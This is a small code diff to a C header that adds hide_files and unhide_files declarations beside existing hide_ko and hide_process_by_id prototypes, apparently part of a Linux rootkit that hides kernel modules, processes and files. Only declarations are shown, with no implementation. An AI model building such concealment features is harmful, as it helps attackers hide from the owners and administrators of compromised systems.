@@ -25,4 +25,7 @@ void hide_ko(char *ko_name);
 
 void hide_process_by_id(int id);
 
+void hide_files(void);
+void unhide_files(void);
+
 #endif /* HIDE_H */
